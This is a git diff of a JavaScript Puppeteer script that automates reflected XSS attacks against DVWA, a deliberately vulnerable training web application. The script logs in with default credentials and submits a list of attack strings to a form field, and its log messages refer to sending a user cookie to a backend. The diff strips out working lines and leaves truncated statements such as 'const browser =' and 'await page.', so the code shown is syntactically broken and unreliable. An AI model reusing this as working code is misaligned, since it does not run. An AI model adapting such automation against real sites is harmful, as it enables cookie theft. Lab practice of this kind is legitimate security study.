@@ -17,34 +17,29 @@ const delay = (time) => {
 const xssAutoReflected= async (targetURL, attacks, level) => {
 
     // Launch a headless Chromium for scraping.
-    const browser = await puppeteer.launch({headless: false});
-    const page = await browser.newPage()
-    await page.goto(targetURL)
+    const browser =
+    const page = 
+    
     
     // Login to DVWA webpage
     await page.$eval('input[name=username]', el => el.value = 'admin')
-    await page.$eval('input[name=password]', el => el.value = 'password')
-    await page.click('input[type="submit"]');
+    await page.$eval
+    
 
     // Check the Level and set to the value passed as a parameter (level)
-    await page.click('#main_menu_padded > ul:nth-child(3) > li:nth-child(1) > a')
-    
-    await page.select('#main_body > div > form > select', level)
-    await page.click('input[type="submit"]');
+    await page.click
     await delay(3000);    
+    
     //Try attacks on the array and see whether all the attacks are performed well. 
     for(let i=0; i<attacks.length;i++) {
         console.log(`${i+1}th Attack Start`)
-        await page.click('#main_menu_padded > ul:nth-child(2) > li:nth-child(11) > a')
+        await page.click
         
         console.log("Sending a user cookie to the backend")
-        await page.$eval('input[name=name]', (el, attack) => {
-            el.value = attack
-        }, attacks[i])
-        await delay(2000);
+        await page.$eval
 
-        await page.click('input[type="submit"]');
         console.log("Sent")
+        await page.
     
         await delay(2000);
         console.log(`${i+1}th Attack End`)
